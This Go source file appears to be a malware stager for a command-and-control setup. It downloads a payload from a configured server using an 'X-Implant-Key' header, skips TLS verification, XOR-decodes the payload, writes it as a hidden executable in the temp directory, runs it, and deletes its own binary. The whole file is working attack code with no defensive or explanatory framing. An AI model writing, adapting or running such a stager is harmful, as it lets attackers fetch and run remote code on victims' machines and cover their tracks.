package main

import (
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

var (
	buildServerURL  = ""
	buildStagePath  = "/api/v1/agent/stage/"
	buildStageID    = ""
	buildXORKey     = ""
	buildImplantKey = ""
)

func main() {
	if buildServerURL == "" || buildStageID == "" {
		os.Exit(1)
	}

	url := buildServerURL + buildStagePath + buildStageID
	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		os.Exit(1)
	}
	if buildImplantKey != "" {
		req.Header.Set("X-Implant-Key", buildImplantKey)
	}

	resp, err := client.Do(req)
	if err != nil {
		os.Exit(1)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		os.Exit(1)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil || len(data) == 0 {
		os.Exit(1)
	}

	if buildXORKey != "" {
		key, err := hex.DecodeString(buildXORKey)
		if err == nil && len(key) > 0 {
			for i := range data {
				data[i] ^= key[i%len(key)]
			}
		}
	}

	suffix := ""
	if runtime.GOOS == "windows" {
		suffix = ".exe"
	}
	tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf(".%x%s", os.Getpid(), suffix))
	if err := os.WriteFile(tmpPath, data, 0755); err != nil {
		os.Exit(1)
	}

	cmd := exec.Command(tmpPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Start()

	os.Remove(os.Args[0])
}
